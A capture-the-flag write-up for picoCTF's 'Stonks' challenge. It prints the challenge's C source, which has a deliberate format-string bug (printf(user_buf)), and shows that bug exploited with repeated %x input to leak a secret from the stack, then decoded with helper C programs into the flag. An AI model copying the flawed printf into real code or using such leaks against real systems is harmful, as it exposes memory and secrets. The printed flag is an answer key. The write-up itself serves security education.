# Stonks
#### Write-up author: [jon-brandy](https://github.com/jon-brandy)
## DESCRIPTION:
I decided to try something noone else has before. 
I made a bot to automatically trade stonks for me using AI and machine learning. 
I wouldn't believe you if you told me it's unsecure! 
[vuln.c](https://github.com/jon-brandy/CTF-WRITE-UP/blob/9496c9b2a18da32edc5c92eefe0dad8304f27b13/Asset/Stonks/vuln.c) `nc mercury.picoctf.net 20195`.
## HINT:
1. Okay, maybe I'd believe you if you find my API key.
## STEPS:
1. First, download the `.c` code and open it on vscode or any code editor you have.

> vuln.c

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}

```

2. These lines caught my attention.

![image](https://user-images.githubusercontent.com/70703371/180940267-f84403c5-5c59-4f15-9731-8c0e51048347.png)

3. Next, let's try to run the netcat command -> `nc mercury.picoctf.net 20195` at your kali linux terminal.

> OUTPUT:

![image](https://user-images.githubusercontent.com/70703371/180940551-6ab8e256-a424-4412-b34e-4fb33ac50ff7.png)

4. Let's choose number 1.

> OUTPUT:

![image](https://user-images.githubusercontent.com/70703371/180940646-d7d1fc7b-be68-45df-b7bf-6429eb9b3326.png)

5. Based from these lines of code, since there's a printf at the end of the line but no quotation mark, it's a vuln then (means we can specify a format string). For this solution, i input the `%x` as many as i want to.

> %x -> it would print the output in hex format

```
char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

![image](https://user-images.githubusercontent.com/70703371/180951019-a7a00a06-05f5-459d-9327-bef2df2ede3c.png)


6. We got the token!

```
85c3410804b00080489c3f7f6cd80ffffffff185c1160f7f7a110f7f6cdc7085c2180285c33f085c34106f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3534303664303664ffa5007df7fa7af8f7f7a4406064510010f7e09ce9f7f7b0c0f7f6c5c0f7f6c000ffa5c988f7dfa68df7f6c5c08048ecaffa5c9940f7f8ef09804b000f7f6c000f7f6ce20ffa5c9c8f7f94d50f7f6d89060645100f7f6c000804b000ffa5c9c88048c8685c1160ffa5c9b4ffa5c9c88048be9f7f6c3fc0ffa5ca7cffa5ca741185c116060645100ffa5c9e000f7daffa1f7f6c000f7f6c0000f7daffa11ffa5ca74ffa5ca7cffa5ca0410f7f6c000
```

7. Let's decode it using [this](https://www.binaryhexconverter.com/hex-to-ascii-text-converter) online decoder.

> OUTPUT:

![image](https://user-images.githubusercontent.com/70703371/180951374-c15b1de7-f57d-4d74-9337-e25f5dec52fc.png)

8. These characters caught my attention:

```
ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ¥}
```

9. It must be the flag, but each 4 characters block are reversed.
10. For this solution i used `.c` program to reversed it every 4 characters.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ¥o}

int main(void)
{
    char strings[] = {"ocip"};
    char strings2[] = {"{FTC"};
    char strings3[] = {"0l_I"};
    char strings4[] = {"4_t5"};
    char strings5[] = {"m_ll"};
    char strings6[] = {"0m_y"};
    char strings7[] = {"_y3n"};
    char strings8[] = {"5406"};
    char strings9[] = {"d06d"};
    char strings10[] = {"ÿ¥o}"};
    for(int i = strlen(strings) - 1; i >= 0; i--)
    {
        printf("%c", strings[i]);
    }
    for(int i =  strlen(strings2) - 1; i >= 0; i--)
    {
        printf("%c", strings2[i]);
    }
    for(int i =  strlen(strings3) - 1; i >= 0; i--)
    {
        printf("%c", strings3[i]);
    }
    for(int i =  strlen(strings4) - 1; i >= 0; i--)
    {
        printf("%c", strings4[i]);
    }
    for(int i =  strlen(strings5) - 1; i >= 0; i--)
    {
        printf("%c", strings5[i]);
    }
    for(int i =  strlen(strings6) - 1; i >= 0; i--)
    {
        printf("%c", strings6[i]);
    }
    for(int i =  strlen(strings7) - 1; i >= 0; i--)
    {
        printf("%c", strings7[i]);
    }
    for(int i =  strlen(strings8) - 1; i >= 0; i--)
    {
        printf("%c", strings8[i]);
    }
    for(int i =  strlen(strings9) - 1; i >= 0; i--)
    {
        printf("%c", strings9[i]);
    }
    for(int i =  strlen(strings10) - 1; i >= 0; i--)
    {
        printf("%c", strings10[i]);
    }


    return 0;
}
```

> RESULT

```
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}o¥ÿ
```

Or you may use this `.c` program made by my friend -> [raphael-lesmana](https://github.com/raphael-lesmana).

```c
#include <stdio.h>
#include <string.h>

char *str = "ocip{FTC0l_I4_t5m_ll0m_y_y3n5406d06dÿ¥o}";

int main(void)
{
    int len = strlen(str);
    int x = len;
    int i = 0;
    int k = 0;
    int l = 0;
    char output[len + 1];
    char tmp[4];
    while (l < len)
    {
        k = 0;
        for (int j = 0 + i; j < 4 + i; j++)
        {
            tmp[k++] = str[j];
            x--;
            if (x < 1)
                break;
        }
        for (int j = k - 1; j >= 0; j--)
        {
            output[l++] = tmp[j];
        }
        i += 4;
    }
    output[len] = '\0';
    printf("%s\n", output);
}
```


11. Finally we got the flag!

---
## FLAG

```
picoCTF{I_l05t_4ll_my_m0n3y_6045d60d}
```
